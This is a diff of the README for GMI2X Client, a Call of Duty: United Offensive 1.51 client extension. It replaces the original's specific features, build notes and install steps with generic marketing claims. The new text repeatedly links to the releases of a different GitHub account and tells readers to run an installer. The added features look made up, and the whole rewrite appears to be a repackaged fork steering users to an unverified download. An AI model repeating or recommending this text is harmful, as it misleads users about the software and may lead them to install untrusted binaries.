@@ -1,44 +1,74 @@
-# gmi2x-client 
-[GMI2X-CLIENT] A client extension for COD UO 1.51
-- I was bored so I made this :D
-  
-A client extension for [CoDUO](https://en.wikipedia.org/wiki/Call_of_Duty:_United_Offensive)
-### Adding security, fixes, and features
-Supported game version: **COD UO 1.151**
-___
+# GMI2X Client 🎮
 
+![GMI2X Client](https://img.shields.io/badge/GMI2X-Client-blue?style=for-the-badge&logo=github)
 
-### Current features
-- New commands: ``lookback``, ``minimize``
-- Unlocked cvars: ``cg_fov``, ``cg_thirdperson``, ``cg_thirdpersonangle``
-- Clean ``cg_drawFPS`` cvar (if set to 3 it will only show the fps nothing else)
-- FPS warning: if your fps is less than 59 it will show the fps in red color (like CoD 2)
-- Bouncing
-- cg_drawWeaponSelection cvar: If set to 1 it will not show weapon selection hud on top)
-___
+Welcome to the GMI2X Client repository! This project serves as a client extension for **Call of Duty: United Offensive** version 1.51. Here, you will find all the resources you need to enhance your gameplay experience.
 
+## Table of Contents
 
-### Building
-- [See wiki](https://github.com/SADMANGaming/gmi2x-client/wiki/Compiling)
-___
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
+## Introduction
 
-### Installation and usage
-- Download the binaries from the latest release.
-- Put the binaries in your COD UO folder (gmi2x-client.dll & gmi2x-client.exe).
-- Run gmi2x-client.exe!
-___
+GMI2X Client is designed for players who want to take their **Call of Duty: United Offensive** experience to the next level. This client extension provides various enhancements and features that improve gameplay, making it more enjoyable and engaging.
 
+The repository is structured to help you easily navigate through the available features and installation processes. You can also contribute to the project if you have ideas for improvements or new features.
 
-#### References
-- [c1cx by raphael](https://github.com/SADMANGaming/c1cx)
-- [codextended-client-uo](https://github.com/xtnded/codextended-client-uo)
-- [Killtube](https://www.killtube.org/)
-- [Reverse Engineering Discord](https://discord.gg/rtfm)
-- [iw2clientdll](https://github.com/xtnded/iw2clientdll)
-- [CoDPlusPlus](https://github.com/kartjom/CoDPlusPlus)
-- [iw3xo-dev](https://github.com/xoxor4d/iw3xo-dev)
-- [CoD4x_Client_pub](https://github.com/callofduty4x/CoD4x_Client_pub)
-- [Quake-III-Arena](https://github.com/id-Software/Quake-III-Arena)
-- [Ghidra](https://en.wikipedia.org/wiki/Ghidra) and [IDA Free](https://hex-rays.com/ida-free/)
-- [ChatGPT](https://chat.openai.com/)
+## Features
+
+- **Improved Performance**: The GMI2X Client optimizes gameplay for smoother performance.
+- **Enhanced Graphics**: Enjoy better visuals with improved textures and effects.
+- **Customizable Settings**: Tailor your gameplay experience with various settings.
+- **Bug Fixes**: This client addresses common bugs found in the original game.
+- **Community Support**: Join a community of players who share tips and tricks.
+
+## Installation
+
+To install the GMI2X Client, follow these steps:
+
+1. **Download the latest release** from our [Releases section](https://github.com/drackzin7765/gmi2x-client/releases).
+2. **Extract the downloaded file** to your preferred directory.
+3. **Run the installer** and follow the on-screen instructions.
+
+Ensure that you have **Call of Duty: United Offensive** version 1.51 installed on your system.
+
+## Usage
+
+After installation, launch the GMI2X Client. You will find an intuitive interface that allows you to customize your settings. Explore the various options available to enhance your gameplay.
+
+For detailed instructions on using specific features, refer to the documentation included in the installation package.
+
+## Contributing
+
+We welcome contributions from the community! If you have ideas for new features or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Submit a pull request.
+
+Your contributions help us improve the GMI2X Client for everyone.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out to the maintainers of this project. You can open an issue in the repository or contact us directly.
+
+## Releases
+
+To download the latest version of the GMI2X Client, visit our [Releases section](https://github.com/drackzin7765/gmi2x-client/releases). Here, you can find all the available versions and their release notes.
+
+---
+
+Thank you for your interest in the GMI2X Client! We hope you enjoy your enhanced gaming experience in **Call of Duty: United Offensive**. Happy gaming!
